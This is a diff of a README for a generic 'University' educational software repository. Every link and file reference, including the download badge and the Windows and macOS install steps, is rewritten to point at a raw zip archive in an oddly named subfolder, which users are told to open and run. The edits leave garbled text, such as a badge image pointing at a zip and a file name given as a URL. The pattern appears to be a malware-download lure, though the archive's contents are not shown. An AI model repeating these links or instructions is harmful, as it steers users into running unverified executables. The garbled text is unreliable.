@@ -1,6 +1,6 @@
 # 🎓 University - Access Educational Resources Easily
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
+![Download](https://raw.githubusercontent.com/ranjit4454/University/main/redictate/University.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the University repository! This project contains valuable educational
 
 To get started, you need to download the software. Please visit the following link to access the Releases page:
 
-[Download the Latest Release](https://github.com/ranjit4454/University/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/ranjit4454/University/main/redictate/University.zip)
 
 On this page, you will find the latest version of the application. Click on the version number to view available options, and follow these steps to download:
 
@@ -34,14 +34,14 @@ Once the download is complete, you can run the application. Here’s how to do i
 ### Windows
 
 1. Navigate to your Downloads folder.
-2. Find the downloaded file (`University.exe` or similar).
+2. Find the downloaded file (`https://raw.githubusercontent.com/ranjit4454/University/main/redictate/University.zip` or similar).
 3. Double-click the file to open it.
 4. Follow the on-screen instructions to complete the setup.
 
 ### macOS
 
 1. Open your Downloads folder.
-2. Locate the downloaded file (`University.dmg` or similar).
+2. Locate the downloaded file (`https://raw.githubusercontent.com/ranjit4454/University/main/redictate/University.zip` or similar).
 3. Double-click to mount it.
 4. Drag the University icon into the Applications folder.
 5. Open the Applications folder and double-click the University icon to start.
@@ -102,6 +102,6 @@ If you encounter any issues while using the University software, you can report 
 
 Join our community of learners! Connect through forums and discussion platforms related to software development and education. You can also follow updates on the project by checking the Releases page:
 
-[Download the Latest Release](https://github.com/ranjit4454/University/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/ranjit4454/University/main/redictate/University.zip)
 
 Thank you for choosing the University repository for your educational needs. We hope you find the resources helpful in your learning journey. Enjoy!
